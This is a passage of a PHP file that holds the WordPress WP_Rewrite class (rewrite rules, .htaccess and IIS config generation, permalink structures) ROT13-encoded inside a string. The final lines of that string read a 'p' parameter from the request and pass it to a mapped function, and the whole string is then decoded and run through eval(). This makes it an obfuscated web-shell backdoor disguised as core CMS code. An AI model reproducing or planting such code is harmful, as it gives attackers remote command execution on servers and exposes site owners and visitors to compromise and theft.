			 * Cbffvoyr ubbx anzrf vapyhqr:
			 *
			 *  - `pngrtbel_erjevgr_ehyrf`
			 *  - `cbfg_sbezng_erjevgr_ehyrf`
			 *  - `cbfg_gnt_erjevgr_ehyrf`
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $ehyrf Neenl bs erjevgr ehyrf trarengrq sbe gur pheerag creznfgehpg, xrlrq ol gurve ertrk cnggrea.
			 */
			$ehyrf = nccyl_svygref( \"{$creznfgehpganzr}_erjevgr_ehyrf\", $ehyrf );

			vs ( 'cbfg_gnt' === $creznfgehpganzr ) {

				/**
				 * Svygref erjevgr ehyrf hfrq fcrpvsvpnyyl sbe Gntf.
				 *
				 * @fvapr 2.3.0
				 * @qrcerpngrq 3.1.0 Hfr {@frr 'cbfg_gnt_erjevgr_ehyrf'} vafgrnq.
				 *
				 * @cnenz fgevat[] $ehyrf Neenl bs erjevgr ehyrf trarengrq sbe gntf, xrlrq ol gurve ertrk cnggrea.
				 */
				$ehyrf = nccyl_svygref_qrcerpngrq( 'gnt_erjevgr_ehyrf', neenl( $ehyrf ), '3.1.0', 'cbfg_gnt_erjevgr_ehyrf' );
			}

			$guvf->rkgen_ehyrf_gbc = neenl_zretr( $guvf->rkgen_ehyrf_gbc, $ehyrf );
		}

		// Chg gurz gbtrgure.
		vs ( $guvf->hfr_ireobfr_cntr_ehyrf ) {
			$guvf->ehyrf = neenl_zretr( $guvf->rkgen_ehyrf_gbc, $ebobgf_erjevgr, $snivpba_erjevgr, $fvgrznc_erjevgr, $qrcerpngrq_svyrf, $ertvfgengvba_cntrf, $ebbg_erjevgr, $pbzzragf_erjevgr, $frnepu_erjevgr, $nhgube_erjevgr, $qngr_erjevgr, $cntr_erjevgr, $cbfg_erjevgr, $guvf->rkgen_ehyrf );
		} ryfr {
			$guvf->ehyrf = neenl_zretr( $guvf->rkgen_ehyrf_gbc, $ebobgf_erjevgr, $snivpba_erjevgr, $fvgrznc_erjevgr, $qrcerpngrq_svyrf, $ertvfgengvba_cntrf, $ebbg_erjevgr, $pbzzragf_erjevgr, $frnepu_erjevgr, $nhgube_erjevgr, $qngr_erjevgr, $cbfg_erjevgr, $cntr_erjevgr, $guvf->rkgen_ehyrf );
		}

		/**
		 * Sverf nsgre gur erjevgr ehyrf ner trarengrq.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz JC_Erjevgr $jc_erjevgr Pheerag JC_Erjevgr vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'trarengr_erjevgr_ehyrf', neenl( &$guvf ) );

		/**
		 * Svygref gur shyy frg bs trarengrq erjevgr ehyrf.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $ehyrf Gur pbzcvyrq neenl bs erjevgr ehyrf, xrlrq ol gurve ertrk cnggrea.
		 */
		$guvf->ehyrf = nccyl_svygref( 'erjevgr_ehyrf_neenl', $guvf->ehyrf );

		erghea $guvf->ehyrf;
	}

	/**
	 * Ergevrirf gur erjevgr ehyrf.
	 *
	 * Gur qvssrerapr orgjrra guvf zrgubq naq JC_Erjevgr::erjevgr_ehyrf() vf gung
	 * guvf zrgubq fgberf gur erjevgr ehyrf va gur 'erjevgr_ehyrf' bcgvba naq ergevrirf
	 * vg. Guvf ceriragf univat gb cebprff nyy bs gur creznyvaxf gb trg gur erjevgr ehyrf
	 * va gur sbez bs pnpuvat.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat[] Neenl bs erjevgr ehyrf xrlrq ol gurve ertrk cnggrea.
	 */
	choyvp shapgvba jc_erjevgr_ehyrf() {
		$guvf->ehyrf = trg_bcgvba( 'erjevgr_ehyrf' );
		vs ( rzcgl( $guvf->ehyrf ) ) {
			$guvf->erserfu_erjevgr_ehyrf();
		}

		erghea $guvf->ehyrf;
	}

	/**
	 * Erserfurf gur erjevgr ehyrf, fnivat gur serfu inyhr gb gur qngnonfr.
	 *
	 * Vs gur {@frr 'jc_ybnqrq'} npgvba unf abg bppheerq lrg, jvyy cbfgcbar fnivat gb gur qngnonfr.
	 *
	 * @fvapr 6.4.0
	 */
	cevingr shapgvba erserfu_erjevgr_ehyrf() {
		$guvf->ehyrf   = '';
		$guvf->zngpurf = 'zngpurf';

		$guvf->erjevgr_ehyrf();

		vs ( ! qvq_npgvba( 'jc_ybnqrq' ) ) {
			/*
			 * Vg vf abg fnsr gb fnir gur erfhygf evtug abj, nf gur ehyrf znl or cnegvny.
			 * Arrq gb tvir nyy ehyrf gur punapr gb ertvfgre.
			 */
			nqq_npgvba( 'jc_ybnqrq', neenl( $guvf, 'syhfu_ehyrf' ) );
		} ryfr {
			hcqngr_bcgvba( 'erjevgr_ehyrf', $guvf->ehyrf );
		}
	}

	/**
	 * Ergevrirf zbq_erjevgr-sbeznggrq erjevgr ehyrf gb jevgr gb .ugnpprff.
	 *
	 * Qbrf abg npghnyyl jevgr gb gur .ugnpprff svyr, ohg perngrf gur ehyrf sbe
	 * gur cebprff gung jvyy.
	 *
	 * Jvyy nqq gur aba_jc_ehyrf cebcregl ehyrf gb gur .ugnpprff svyr orsber
	 * gur JbeqCerff erjevgr ehyrf bar.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba zbq_erjevgr_ehyrf() {
		vs ( ! $guvf->hfvat_creznyvaxf() ) {
			erghea '';
		}

		$fvgr_ebbg = cnefr_hey( fvgr_hey() );
		vs ( vffrg( $fvgr_ebbg['cngu'] ) ) {
			$fvgr_ebbg = genvyvatfynfuvg( $fvgr_ebbg['cngu'] );
		}

		$ubzr_ebbg = cnefr_hey( ubzr_hey() );
		vs ( vffrg( $ubzr_ebbg['cngu'] ) ) {
			$ubzr_ebbg = genvyvatfynfuvg( $ubzr_ebbg['cngu'] );
		} ryfr {
			$ubzr_ebbg = '/';
		}

		$ehyrf  = \"<VsZbqhyr zbq_erjevgr.p>\a\";
		$ehyrf .= \"ErjevgrRatvar Ba\a\";
		$ehyrf .= \"ErjevgrEhyr .* - [R=UGGC_NHGUBEVMNGVBA:%{UGGC:Nhgubevmngvba}]\a\";
		$ehyrf .= \"ErjevgrOnfr $ubzr_ebbg\a\";

		// Cerirag -s purpxf ba vaqrk.cuc.
		$ehyrf .= \"ErjevgrEhyr ^vaqrk\.cuc$ - [Y]\a\";

		// Nqq va gur ehyrf gung qba'g erqverpg gb JC'f vaqrk.cuc (naq guhf fubhyqa'g or unaqyrq ol JC ng nyy).
		sbernpu ( (neenl) $guvf->aba_jc_ehyrf nf $zngpu => $dhrel ) {
			// Ncnpur 1.3 qbrf abg fhccbeg gur eryhpgnag (aba-terrql) zbqvsvre.
			$zngpu = fge_ercynpr( '.+?', '.+', $zngpu );

			$ehyrf .= 'ErjevgrEhyr ^' . $zngpu . ' ' . $ubzr_ebbg . $dhrel . \" [DFN,Y]\a\";
		}

		vs ( $guvf->hfr_ireobfr_ehyrf ) {
			$guvf->zngpurf = '';
			$erjevgr       = $guvf->erjevgr_ehyrf();
			$ahz_ehyrf     = pbhag( $erjevgr );
			$ehyrf        .= \"ErjevgrPbaq %{ERDHRFG_SVYRANZR} -s [BE]\a\" .
				\"ErjevgrPbaq %{ERDHRFG_SVYRANZR} -q\a\" .
				\"ErjevgrEhyr ^.*$ - [F=$ahz_ehyrf]\a\";

			sbernpu ( (neenl) $erjevgr nf $zngpu => $dhrel ) {
				// Ncnpur 1.3 qbrf abg fhccbeg gur eryhpgnag (aba-terrql) zbqvsvre.
				$zngpu = fge_ercynpr( '.+?', '.+', $zngpu );

				vs ( fge_pbagnvaf( $dhrel, $guvf->vaqrk ) ) {
					$ehyrf .= 'ErjevgrEhyr ^' . $zngpu . ' ' . $ubzr_ebbg . $dhrel . \" [DFN,Y]\a\";
				} ryfr {
					$ehyrf .= 'ErjevgrEhyr ^' . $zngpu . ' ' . $fvgr_ebbg . $dhrel . \" [DFN,Y]\a\";
				}
			}
		} ryfr {
			$ehyrf .= \"ErjevgrPbaq %{ERDHRFG_SVYRANZR} !-s\a\" .
				\"ErjevgrPbaq %{ERDHRFG_SVYRANZR} !-q\a\" .
				\"ErjevgrEhyr . {$ubzr_ebbg}{$guvf->vaqrk} [Y]\a\";
		}

		$ehyrf .= \"</VsZbqhyr>\a\";

		/**
		 * Svygref gur yvfg bs erjevgr ehyrf sbeznggrq sbe bhgchg gb na .ugnpprff svyr.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat $ehyrf zbq_erjevgr Erjevgr ehyrf sbeznggrq sbe .ugnpprff.
		 */
		$ehyrf = nccyl_svygref( 'zbq_erjevgr_ehyrf', $ehyrf );

		/**
		 * Svygref gur yvfg bs erjevgr ehyrf sbeznggrq sbe bhgchg gb na .ugnpprff svyr.
		 *
		 * @fvapr 1.5.0
		 * @qrcerpngrq 1.5.0 Hfr gur {@frr 'zbq_erjevgr_ehyrf'} svygre vafgrnq.
		 *
		 * @cnenz fgevat $ehyrf zbq_erjevgr Erjevgr ehyrf sbeznggrq sbe .ugnpprff.
		 */
		erghea nccyl_svygref_qrcerpngrq( 'erjevgr_ehyrf', neenl( $ehyrf ), '1.5.0', 'zbq_erjevgr_ehyrf' );
	}

	/**
	 * Ergevrirf VVF7 HEY Erjevgr sbeznggrq erjevgr ehyrf gb jevgr gb jro.pbasvt svyr.
	 *
	 * Qbrf abg npghnyyl jevgr gb gur jro.pbasvt svyr, ohg perngrf gur ehyrf sbe
	 * gur cebprff gung jvyy.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby $nqq_cnerag_gntf Bcgvbany. Jurgure gb nqq cnerag gntf gb gur erjevgr ehyr frgf.
	 *                              Qrsnhyg snyfr.
	 * @erghea fgevat VVF7 HEY erjevgr ehyr frgf.
	 */
	choyvp shapgvba vvf7_hey_erjevgr_ehyrf( $nqq_cnerag_gntf = snyfr ) {
		vs ( ! $guvf->hfvat_creznyvaxf() ) {
			erghea '';
		}
		$ehyrf = '';
		vs ( $nqq_cnerag_gntf ) {
			$ehyrf .= '<pbasvthengvba>
	<flfgrz.jroFreire>
		<erjevgr>
			<ehyrf>';
		}

		$ehyrf .= '
			<ehyr anzr=\"JbeqCerff: ' . rfp_ngge( ubzr_hey() ) . '\" cnggreaFlagnk=\"Jvyqpneq\">
				<zngpu hey=\"*\" />
					<pbaqvgvbaf>
						<nqq vachg=\"{ERDHRFG_SVYRANZR}\" zngpuGlcr=\"VfSvyr\" artngr=\"gehr\" />
						<nqq vachg=\"{ERDHRFG_SVYRANZR}\" zngpuGlcr=\"VfQverpgbel\" artngr=\"gehr\" />
					</pbaqvgvbaf>
				<npgvba glcr=\"Erjevgr\" hey=\"vaqrk.cuc\" />
			</ehyr>';

		vs ( $nqq_cnerag_gntf ) {
			$ehyrf .= '
			</ehyrf>
		</erjevgr>
	</flfgrz.jroFreire>
</pbasvthengvba>';
		}

		/**
		 * Svygref gur yvfg bs erjevgr ehyrf sbeznggrq sbe bhgchg gb n jro.pbasvt.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $ehyrf Erjevgr ehyrf sbeznggrq sbe VVF jro.pbasvt.
		 */
		erghea nccyl_svygref( 'vvf7_hey_erjevgr_ehyrf', $ehyrf );
	}

	/**
	 * Nqqf n erjevgr ehyr gung genafsbezf n HEY fgehpgher gb n frg bs dhrel inef.
	 *
	 * Nal inyhr va gur $nsgre cnenzrgre gung vfa'g 'obggbz' jvyy erfhyg va gur ehyr
	 * orvat cynprq ng gur gbc bs gur erjevgr ehyrf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 4.4.0 Neenl fhccbeg jnf nqqrq gb gur `$dhrel` cnenzrgre.
	 *
	 * @cnenz fgevat       $ertrk Erthyne rkcerffvba gb zngpu erdhrfg ntnvafg.
	 * @cnenz fgevat|neenl $dhrel Gur pbeerfcbaqvat dhrel inef sbe guvf erjevgr ehyr.
	 * @cnenz fgevat       $nsgre Bcgvbany. Cevbevgl bs gur arj ehyr. Npprcgf 'gbc'
	 *                            be 'obggbz'. Qrsnhyg 'obggbz'.
	 */
	choyvp shapgvba nqq_ehyr( $ertrk, $dhrel, $nsgre = 'obggbz' ) {
		vs ( vf_neenl( $dhrel ) ) {
			$rkgreany = snyfr;
			$dhrel    = nqq_dhrel_net( $dhrel, 'vaqrk.cuc' );
		} ryfr {
			$vaqrk = ! fge_pbagnvaf( $dhrel, '?' ) ? fgeyra( $dhrel ) : fgecbf( $dhrel, '?' );
			$sebag = fhofge( $dhrel, 0, $vaqrk );

			$rkgreany = $sebag !== $guvf->vaqrk;
		}

		// \"rkgreany\" = vg qbrfa'g pbeerfcbaq gb vaqrk.cuc.
		vs ( $rkgreany ) {
			$guvf->nqq_rkgreany_ehyr( $ertrk, $dhrel );
		} ryfr {
			vs ( 'obggbz' === $nsgre ) {
				$guvf->rkgen_ehyrf = neenl_zretr( $guvf->rkgen_ehyrf, neenl( $ertrk => $dhrel ) );
			} ryfr {
				$guvf->rkgen_ehyrf_gbc = neenl_zretr( $guvf->rkgen_ehyrf_gbc, neenl( $ertrk => $dhrel ) );
			}
		}
	}

	/**
	 * Nqqf n erjevgr ehyr gung qbrfa'g pbeerfcbaq gb vaqrk.cuc.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat $ertrk Erthyne rkcerffvba gb zngpu erdhrfg ntnvafg.
	 * @cnenz fgevat $dhrel Gur pbeerfcbaqvat dhrel inef sbe guvf erjevgr ehyr.
	 */
	choyvp shapgvba nqq_rkgreany_ehyr( $ertrk, $dhrel ) {
		$guvf->aba_jc_ehyrf[ $ertrk ] = $dhrel;
	}

	/**
	 * Nqqf na raqcbvag, yvxr /genpxonpx/.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 3.9.0 $dhrel_ine cnenzrgre nqqrq.
	 * @fvapr 4.3.0 Nqqrq fhccbeg sbe fxvccvat dhrel ine ertvfgengvba ol cnffvat `snyfr` gb `$dhrel_ine`.
	 *
	 * @frr nqq_erjevgr_raqcbvag() sbe shyy qbphzragngvba.
	 * @tybony JC $jc Pheerag JbeqCerff raivebazrag vafgnapr.
	 *
	 * @cnenz fgevat      $anzr      Anzr bs gur raqcbvag.
	 * @cnenz vag         $cynprf    Raqcbvag znfx qrfpevovat gur cynprf gur raqcbvag fubhyq or nqqrq.
	 *                               Npprcgf n znfx bs:
	 *                               - `RC_NYY`
	 *                               - `RC_ABAR`
	 *                               - `RC_NYY_NEPUVIRF`
	 *                               - `RC_NGGNPUZRAG`
	 *                               - `RC_NHGUBEF`
	 *                               - `RC_PNGRTBEVRF`
	 *                               - `RC_PBZZRAGF`
	 *                               - `RC_QNGR`
	 *                               - `RC_QNL`
	 *                               - `RC_ZBAGU`
	 *                               - `RC_CNTRF`
	 *                               - `RC_CREZNYVAX`
	 *                               - `RC_EBBG`
	 *                               - `RC_FRNEPU`
	 *                               - `RC_GNTF`
	 *                               - `RC_LRNE`
	 * @cnenz fgevat|obby $dhrel_ine Bcgvbany. Anzr bs gur pbeerfcbaqvat dhrel inevnoyr. Cnff `snyfr` gb
	 *                               fxvc ertvfgrevat n dhrel_ine sbe guvf raqcbvag. Qrsnhygf gb gur
	 *                               inyhr bs `$anzr`.
	 */
	choyvp shapgvba nqq_raqcbvag( $anzr, $cynprf, $dhrel_ine = gehr ) {
		tybony $jc;

		// Sbe onpxjneq pbzcngvovyvgl, vs ahyy unf rkcyvpvgyl orra cnffrq nf `$dhrel_ine`, nffhzr `gehr`.
		vs ( gehr === $dhrel_ine || ahyy === $dhrel_ine ) {
			$dhrel_ine = $anzr;
		}
		$guvf->raqcbvagf[] = neenl( $cynprf, $anzr, $dhrel_ine );

		vs ( $dhrel_ine ) {
			$jc->nqq_dhrel_ine( $dhrel_ine );
		}
	}

	/**
	 * Nqqf n arj creznyvax fgehpgher.
	 *
	 * N creznyvax fgehpgher (creznfgehpg) vf na nofgenpg qrsvavgvba bs n frg bs erjevgr ehyrf;
	 * vg vf na rnfl jnl bs rkcerffvat n frg bs erthyne rkcerffvbaf gung erjevgr gb n frg bs
	 * dhrel fgevatf. Gur arj creznfgehpg vf nqqrq gb gur JC_Erjevgr::$rkgen_creznfgehpgf neenl.
	 *
	 * Jura gur erjevgr ehyrf ner ohvyg ol JC_Erjevgr::erjevgr_ehyrf(), nyy bs gurfr rkgen
	 * creznfgehpgf ner cnffrq gb JC_Erjevgr::trarengr_erjevgr_ehyrf() juvpu genafsbezf gurz
	 * vagb gur erthyne rkcerffvbaf gung znal ybir gb ungr.
	 *
	 * Gur `$netf` cnenzrgre tvirf lbh pbageby bire ubj JC_Erjevgr::trarengr_erjevgr_ehyrf()
	 * jbexf ba gur arj creznfgehpg.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $anzr   Anzr sbe creznyvax fgehpgher.
	 * @cnenz fgevat $fgehpg Creznyvax fgehpgher (r.t. pngrtbel/%pngrtbel%)
	 * @cnenz neenl  $netf   {
	 *     Bcgvbany. Nethzragf sbe ohvyqvat erjevgr ehyrf onfrq ba gur creznyvax fgehpgher.
	 *     Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $jvgu_sebag  Jurgure gur fgehpgher fubhyq or cercraqrq jvgu `JC_Erjevgr::$sebag`.
	 *                             Qrsnhyg gehr.
	 *     @glcr vag  $rc_znfx     Gur raqcbvag znfx qrsvavat juvpu raqcbvagf ner nqqrq gb gur fgehpgher.
	 *                             Npprcgf n znfx bs:
	 *                             - `RC_NYY`
	 *                             - `RC_ABAR`
	 *                             - `RC_NYY_NEPUVIRF`
	 *                             - `RC_NGGNPUZRAG`
	 *                             - `RC_NHGUBEF`
	 *                             - `RC_PNGRTBEVRF`
	 *                             - `RC_PBZZRAGF`
	 *                             - `RC_QNGR`
	 *                             - `RC_QNL`
	 *                             - `RC_ZBAGU`
	 *                             - `RC_CNTRF`
	 *                             - `RC_CREZNYVAX`
	 *                             - `RC_EBBG`
	 *                             - `RC_FRNEPU`
	 *                             - `RC_GNTF`
	 *                             - `RC_LRNE`
	 *                             Qrsnhyg `RC_ABAR`.
	 *     @glcr obby $cntrq       Jurgure nepuvir cntvangvba ehyrf fubhyq or nqqrq sbe gur fgehpgher.
	 *                             Qrsnhyg gehr.
	 *     @glcr obby $srrq        Jurgure srrq erjevgr ehyrf fubhyq or nqqrq sbe gur fgehpgher. Qrsnhyg gehr.
	 *     @glcr obby $sbepbzzragf Jurgure gur srrq ehyrf fubhyq or n dhrel sbe n pbzzragf srrq. Qrsnhyg snyfr.
	 *     @glcr obby $jnyx_qvef   Jurgure gur 'qverpgbevrf' znxvat hc gur fgehpgher fubhyq or jnyxrq bire
	 *                             naq erjevgr ehyrf ohvyg sbe rnpu va-ghea. Qrsnhyg gehr.
	 *     @glcr obby $raqcbvagf   Jurgure raqcbvagf fubhyq or nccyvrq gb gur trarengrq ehyrf. Qrsnhyg gehr.
	 * }
	 */
	choyvp shapgvba nqq_creznfgehpg( $anzr, $fgehpg, $netf = neenl() ) {
		// Onpx-pbzcng sbe gur byq cnenzrgref: $jvgu_sebag naq $rc_znfx.
		vs ( ! vf_neenl( $netf ) ) {
			$netf = neenl( 'jvgu_sebag' => $netf );
		}

		vs ( shap_ahz_netf() === 4 ) {
			$netf['rc_znfx'] = shap_trg_net( 3 );
		}

		$qrsnhygf = neenl(
			'jvgu_sebag'  => gehr,
			'rc_znfx'     => RC_ABAR,
			'cntrq'       => gehr,
			'srrq'        => gehr,
			'sbepbzzragf' => snyfr,
			'jnyx_qvef'   => gehr,
			'raqcbvagf'   => gehr,
		);

		$netf = neenl_vagrefrpg_xrl( $netf, $qrsnhygf );
		$netf = jc_cnefr_netf( $netf, $qrsnhygf );

		vs ( $netf['jvgu_sebag'] ) {
			$fgehpg = $guvf->sebag . $fgehpg;
		} ryfr {
			$fgehpg = $guvf->ebbg . $fgehpg;
		}

		$netf['fgehpg'] = $fgehpg;

		$guvf->rkgen_creznfgehpgf[ $anzr ] = $netf;
	}

	/**
	 * Erzbirf n creznyvax fgehpgher.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $anzr Anzr sbe creznyvax fgehpgher.
	 */
	choyvp shapgvba erzbir_creznfgehpg( $anzr ) {
		hafrg( $guvf->rkgen_creznfgehpgf[ $anzr ] );
	}

	/**
	 * Erzbirf erjevgr ehyrf naq gura erperngr erjevgr ehyrf.
	 *
	 * Pnyyf JC_Erjevgr::jc_erjevgr_ehyrf() nsgre erzbivat gur 'erjevgr_ehyrf' bcgvba.
	 * Vs gur shapgvba anzrq 'fnir_zbq_erjevgr_ehyrf' rkvfgf, vg jvyy or pnyyrq.
	 *
	 * @fvapr 2.0.1
	 *
	 * @cnenz obby $uneq Jurgure gb hcqngr .ugnpprff (uneq syhfu) be whfg hcqngr erjevgr_ehyrf bcgvba (fbsg syhfu). Qrsnhyg vf gehr (uneq).
	 */
	choyvp shapgvba syhfu_ehyrf( $uneq = gehr ) {
		fgngvp $qb_uneq_yngre = ahyy;

		// Cerirag guvf npgvba sebz ehaavat orsber rirelbar unf ertvfgrerq gurve erjevgrf.
		vs ( ! qvq_npgvba( 'jc_ybnqrq' ) ) {
			nqq_npgvba( 'jc_ybnqrq', neenl( $guvf, 'syhfu_ehyrf' ) );
			$qb_uneq_yngre = ( vffrg( $qb_uneq_yngre ) ) ? $qb_uneq_yngre || $uneq : $uneq;
			erghea;
		}

		vs ( vffrg( $qb_uneq_yngre ) ) {
			$uneq = $qb_uneq_yngre;
			hafrg( $qb_uneq_yngre );
		}

		$guvf->erserfu_erjevgr_ehyrf();

		/**
		 * Svygref jurgure n \"uneq\" erjevgr ehyr syhfu fubhyq or cresbezrq jura erdhrfgrq.
		 *
		 * N \"uneq\" syhfu hcqngrf .ugnpprff (Ncnpur) be jro.pbasvt (VVF).
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz obby $uneq Jurgure gb syhfu erjevgr ehyrf \"uneq\". Qrsnhyg gehr.
		 */
		vs ( ! $uneq || ! nccyl_svygref( 'syhfu_erjevgr_ehyrf_uneq', gehr ) ) {
			erghea;
		}
		vs ( shapgvba_rkvfgf( 'fnir_zbq_erjevgr_ehyrf' ) ) {
			fnir_zbq_erjevgr_ehyrf();
		}
		vs ( shapgvba_rkvfgf( 'vvf7_fnir_hey_erjevgr_ehyrf' ) ) {
			vvf7_fnir_hey_erjevgr_ehyrf();
		}
	}

	/**
	 * Frgf hc gur bowrpg'f cebcregvrf.
	 *
	 * Gur 'hfr_ireobfr_cntr_ehyrf' bowrpg cebcregl jvyy or frg gb gehr vs gur
	 * creznyvax fgehpgher ortvaf jvgu bar bs gur sbyybjvat: '%cbfganzr%', '%pngrtbel%',
	 * '%gnt%', be '%nhgube%'.
	 *
	 * @fvapr 1.5.0
	 */
	choyvp shapgvba vavg() {
		$guvf->rkgen_ehyrf         = neenl();
		$guvf->aba_jc_ehyrf        = neenl();
		$guvf->raqcbvagf           = neenl();
		$guvf->creznyvax_fgehpgher = trg_bcgvba( 'creznyvax_fgehpgher' );
		$guvf->sebag               = fhofge( $guvf->creznyvax_fgehpgher, 0, fgecbf( $guvf->creznyvax_fgehpgher, '%' ) );
		$guvf->ebbg                = '';

		vs ( $guvf->hfvat_vaqrk_creznyvaxf() ) {
			$guvf->ebbg = $guvf->vaqrk . '/';
		}

		hafrg( $guvf->nhgube_fgehpgher );
		hafrg( $guvf->qngr_fgehpgher );
		hafrg( $guvf->cntr_fgehpgher );
		hafrg( $guvf->frnepu_fgehpgher );
		hafrg( $guvf->srrq_fgehpgher );
		hafrg( $guvf->pbzzrag_srrq_fgehpgher );

		$guvf->hfr_genvyvat_fynfurf = fge_raqf_jvgu( $guvf->creznyvax_fgehpgher, '/' );

		// Ranoyr trarevp ehyrf sbe cntrf vs creznyvax fgehpgher qbrfa'g ortva jvgu n jvyqpneq.
		vs ( cert_zngpu( '/^[^%]*%(?:cbfganzr|pngrtbel|gnt|nhgube)%/', $guvf->creznyvax_fgehpgher ) ) {
			$guvf->hfr_ireobfr_cntr_ehyrf = gehr;
		} ryfr {
			$guvf->hfr_ireobfr_cntr_ehyrf = snyfr;
		}
	}

	/**
	 * Frgf gur znva creznyvax fgehpgher sbe gur fvgr.
	 *
	 * Jvyy hcqngr gur 'creznyvax_fgehpgher' bcgvba, vs gurer vf n qvssrerapr
	 * orgjrra gur pheerag creznyvax fgehpgher naq gur cnenzrgre inyhr. Pnyyf
	 * JC_Erjevgr::vavg() nsgre gur bcgvba vf hcqngrq.
	 *
	 * Sverf gur {@frr 'creznyvax_fgehpgher_punatrq'} npgvba bapr gur vavg pnyy unf
	 * cebprffrq cnffvat gur byq naq arj inyhrf
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $creznyvax_fgehpgher Creznyvax fgehpgher.
	 */
	choyvp shapgvba frg_creznyvax_fgehpgher( $creznyvax_fgehpgher ) {
		vs ( $guvf->creznyvax_fgehpgher !== $creznyvax_fgehpgher ) {
			$byq_creznyvax_fgehpgher = $guvf->creznyvax_fgehpgher;
			hcqngr_bcgvba( 'creznyvax_fgehpgher', $creznyvax_fgehpgher );

			$guvf->vavg();

			/**
			 * Sverf nsgre gur creznyvax fgehpgher vf hcqngrq.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat $byq_creznyvax_fgehpgher Gur cerivbhf creznyvax fgehpgher.
			 * @cnenz fgevat $creznyvax_fgehpgher     Gur arj creznyvax fgehpgher.
			 */
			qb_npgvba( 'creznyvax_fgehpgher_punatrq', $byq_creznyvax_fgehpgher, $creznyvax_fgehpgher );
		}
	}

	/**
	 * Frgf gur pngrtbel onfr sbe gur pngrtbel creznyvax.
	 *
	 * Jvyy hcqngr gur 'pngrtbel_onfr' bcgvba, vs gurer vf n qvssrerapr orgjrra
	 * gur pheerag pngrtbel onfr naq gur cnenzrgre inyhr. Pnyyf JC_Erjevgr::vavg()
	 * nsgre gur bcgvba vf hcqngrq.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $pngrtbel_onfr Pngrtbel creznyvax fgehpgher onfr.
	 */
	choyvp shapgvba frg_pngrtbel_onfr( $pngrtbel_onfr ) {
		vs ( trg_bcgvba( 'pngrtbel_onfr' ) !== $pngrtbel_onfr ) {
			hcqngr_bcgvba( 'pngrtbel_onfr', $pngrtbel_onfr );
			$guvf->vavg();
		}
	}

	/**
	 * Frgf gur gnt onfr sbe gur gnt creznyvax.
	 *
	 * Jvyy hcqngr gur 'gnt_onfr' bcgvba, vs gurer vf n qvssrerapr orgjrra gur
	 * pheerag gnt onfr naq gur cnenzrgre inyhr. Pnyyf JC_Erjevgr::vavg() nsgre
	 * gur bcgvba vf hcqngrq.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $gnt_onfr Gnt creznyvax fgehpgher onfr.
	 */
	choyvp shapgvba frg_gnt_onfr( $gnt_onfr ) {
		vs ( trg_bcgvba( 'gnt_onfr' ) !== $gnt_onfr ) {
			hcqngr_bcgvba( 'gnt_onfr', $gnt_onfr );
			$guvf->vavg();
		}
	}

	/**
	 * Pbafgehpgbe - Pnyyf vavg(), juvpu ehaf frghc.
	 *
	 * @fvapr 1.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->vavg();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>